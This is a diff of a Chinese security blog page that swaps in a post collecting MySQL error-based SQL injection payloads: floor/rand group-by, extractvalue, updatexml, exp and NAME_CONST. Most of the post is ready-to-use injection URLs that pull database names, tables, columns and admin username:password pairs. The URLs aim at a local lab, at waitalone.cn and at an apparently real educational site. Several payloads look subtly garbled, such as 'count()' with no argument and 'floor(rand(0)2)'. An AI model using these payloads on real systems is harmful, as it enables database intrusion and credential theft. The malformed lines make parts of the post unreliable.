@@ -112,17 +112,17 @@
 
 
 
-  <meta name="description" content="growing up">
+  <meta name="description" content="mysql暴错注入方法整理：通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法。 报错注入：（and后不能直接跟select，可以加（））  1.报错注入floor—-&amp;gt;(select 1 from (select count(*),concat((payload[]),floor(r">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网文件传输">
-<meta property="og:url" content="http://yoursite.com/2018/12/03/内网文件传输/index.html">
+<meta property="og:title" content="MySQL报错注入方法整理">
+<meta property="og:url" content="http://yoursite.com/2018/12/03/MySQL报错注入方法整理/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="growing up">
+<meta property="og:description" content="mysql暴错注入方法整理：通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法。 报错注入：（and后不能直接跟select，可以加（））  1.报错注入floor—-&amp;gt;(select 1 from (select count(*),concat((payload[]),floor(r">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-03T07:15:07.049Z">
+<meta property="og:updated_time" content="2018-12-03T09:32:40.750Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网文件传输">
-<meta name="twitter:description" content="growing up">
+<meta name="twitter:title" content="MySQL报错注入方法整理">
+<meta name="twitter:description" content="mysql暴错注入方法整理：通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法。 报错注入：（and后不能直接跟select，可以加（））  1.报错注入floor—-&amp;gt;(select 1 from (select count(*),concat((payload[]),floor(r">
 
 
 
@@ -131,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/03/内网文件传输/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/03/MySQL报错注入方法整理/">
 
 
 
@@ -141,7 +141,7 @@
   };
 </script>
 
-  <title>内网文件传输 | guolala's blog</title>
+  <title>MySQL报错注入方法整理 | guolala's blog</title>
   
 
 
@@ -354,7 +354,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/03/内网文件传输/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/03/MySQL报错注入方法整理/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="guolala">
@@ -371,7 +371,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">内网文件传输
+          <h1 class="post-title" itemprop="name headline">MySQL报错注入方法整理
               
             
           </h1>
@@ -396,7 +396,7 @@
                 
               
 
-              <time title="创建时间：2018-12-03 14:57:38 / 修改时间：15:15:07" itemprop="dateCreated datePublished" datetime="2018-12-03T14:57:38+08:00">2018-12-03</time>
+              <time title="创建时间：2018-12-03 17:24:50 / 修改时间：17:32:40" itemprop="dateCreated datePublished" datetime="2018-12-03T17:24:50+08:00">2018-12-03</time>
             
 
             
@@ -418,7 +418,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/内网渗透/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a></span>
 
                 
                 
@@ -459,7 +459,44 @@
       
 
       
-        
+        <p>mysql暴错注入方法整理：通过<strong>floor</strong>，<strong>UpdateXml</strong>，<strong>ExtractValue</strong>，<strong>NAME_CONST</strong>，<strong>Error based Double Query Injection</strong>等方法。</p>
+<p>报错注入：（and后不能直接跟select，可以加（））</p>
+<ul>
+<li>1.报错注入floor—-&gt;<code>(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1</code></li>
+<li>2.报错注入extractvalue—-&gt;<code>select extractvalue(1,concat(0x5c,([payload])))</code></li>
+<li>3.报错注入updatexml—-&gt;<code>select 1=(updatexml(1,concat(0x3a,([payload])),1))</code></li>
+<li>4.报错注入Exp—-&gt;<code>select Exp(~(select * from ([payload])a))</code></li>
+</ul>
+<h2 id="通过floor暴错-原理在底部"><a href="#通过floor暴错-原理在底部" class="headerlink" title="通过floor暴错(原理在底部)"></a>通过floor暴错(原理在底部)</h2><h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="/数据库版本/"></a>/数据库版本/</h3><pre><code>http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select version()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+
+</code></pre><h3 id="简单办法暴库"><a href="#简单办法暴库" class="headerlink" title="/简单办法暴库/"></a>/简单办法暴库/</h3><pre><code>http://www.waitalone.cn/sql.php?id=info()
+</code></pre><h3 id="连接用户"><a href="#连接用户" class="headerlink" title="/连接用户/"></a>/连接用户/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="/连接数据库/"></a>/连接数据库/</h3><pre><code>http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+
+</code></pre><h3 id="暴库"><a href="#暴库" class="headerlink" title="/暴库/"></a>/暴库/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre><h3 id="暴表"><a href="#暴表" class="headerlink" title="/暴表/"></a>/暴表/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre><h3 id="暴字段"><a href="#暴字段" class="headerlink" title="/暴字段/"></a>/暴字段/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre><h3 id="暴内容"><a href="#暴内容" class="headerlink" title="/暴内容/"></a>/暴内容/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+</code></pre><h3 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
+</code></pre><h3 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 
+http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+</code></pre><h3 id="NAME-CONST-适用于低版本"><a href="#NAME-CONST-适用于低版本" class="headerlink" title="NAME_CONST(适用于低版本)"></a>NAME_CONST(适用于低版本)</h3><pre><code>http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
+</code></pre><h3 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h3><pre><code>(http://www.vaibs.in/error-based-double-query-injection/)
+</code></pre><h3 id="数据库版本-1"><a href="#数据库版本-1" class="headerlink" title="/数据库版本/"></a>/数据库版本/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+</code></pre><h3 id="floor报错详解"><a href="#floor报错详解" class="headerlink" title="floor报错详解"></a>floor报错详解</h3><pre><code>floor----&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1
+</code></pre><ul>
+<li>Rand() //随机函数</li>
+<li>Floor() //取整函数</li>
+<li>Count() //聚合函数</li>
+<li>Group by key //分组语句</li>
+</ul>
+<blockquote>
+<p>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[这个是Mysql的bug]。</p>
+</blockquote>
+<blockquote>
+<p>0x3a   ：的十六进制，在这里把他作为分隔符，没有它查出来的东西就连成一片。</p>
+</blockquote>
+<p><code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>
+
       
     </div>
 
@@ -489,8 +526,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/03/搜索引擎——永不过时的渗透神器/" rel="next" title="搜索引擎——永不过时的渗透神器">
-                <i class="fa fa-chevron-left"></i> 搜索引擎——永不过时的渗透神器
+              <a href="/2018/12/03/PHP绕过md5/" rel="next" title="PHP绕过md5">
+                <i class="fa fa-chevron-left"></i> PHP绕过md5
               </a>
             
           </div>
@@ -498,10 +535,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/03/基于流量分析的SQL注入检测/" rel="prev" title="基于流量分析的SQL注入检测">
-                基于流量分析的SQL注入检测 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -546,8 +579,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -640,6 +682,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#通过floor暴错-原理在底部"><span class="nav-number">1.</span> <span class="nav-text">通过floor暴错(原理在底部)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库版本"><span class="nav-number">1.1.</span> <span class="nav-text">/数据库版本/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单办法暴库"><span class="nav-number">1.2.</span> <span class="nav-text">/简单办法暴库/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接用户"><span class="nav-number">1.3.</span> <span class="nav-text">/连接用户/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接数据库"><span class="nav-number">1.4.</span> <span class="nav-text">/连接数据库/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴库"><span class="nav-number">1.5.</span> <span class="nav-text">/暴库/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴表"><span class="nav-number">1.6.</span> <span class="nav-text">/暴表/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴字段"><span class="nav-number">1.7.</span> <span class="nav-text">/暴字段/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴内容"><span class="nav-number">1.8.</span> <span class="nav-text">/暴内容/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ExtractValue-有长度限制-最长32位"><span class="nav-number">1.9.</span> <span class="nav-text">ExtractValue(有长度限制,最长32位)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UpdateXml-有长度限制-最长32位"><span class="nav-number">1.10.</span> <span class="nav-text">UpdateXml(有长度限制,最长32位)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NAME-CONST-适用于低版本"><span class="nav-number">1.11.</span> <span class="nav-text">NAME_CONST(适用于低版本)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-based-Double-Query-Injection"><span class="nav-number">1.12.</span> <span class="nav-text">Error based Double Query Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库版本-1"><span class="nav-number">1.13.</span> <span class="nav-text">/数据库版本/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floor报错详解"><span class="nav-number">1.14.</span> <span class="nav-text">floor报错详解</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
